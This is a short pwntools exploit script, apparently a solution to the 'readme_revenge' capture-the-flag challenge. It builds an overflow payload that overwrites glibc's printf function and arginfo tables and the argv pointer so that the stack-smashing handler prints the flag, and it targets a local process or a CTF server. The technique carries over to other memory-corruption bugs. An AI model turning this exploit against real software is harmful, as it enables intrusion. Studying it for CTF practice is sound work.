#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='info')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./readme_revenge')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./readme_revenge')

else:
    libc = ELF('./libc_local')
    p = remote('f.buuoj.cn',20173)

printf_function_table = 0x6b7a28
printf_arginfo_table = 0x6b7aa8
input_addr = 0x6b73e0
stack_chk_fail = 0x4359b0
flag_addr = 0x6b4040
argv_addr = 0x6b7980

def exp():
    #leak libc
    gdb.attach(p,'b* 0x400a51')
    payload = p64(flag_addr)
    payload = payload.ljust(0x73*8,'\x00')
    payload += p64(stack_chk_fail)
    payload = payload.ljust(argv_addr-input_addr,'\x00')
    payload += p64(input_addr)#arg
    payload = payload.ljust(printf_function_table-input_addr,'\x00')
    payload += p64(1)#func not null
    payload = payload.ljust(printf_arginfo_table-input_addr,'\x00')
    payload += p64(input_addr)#arginfo func
    #raw_input()
    p.sendline(payload)
    p.interactive()

exp()
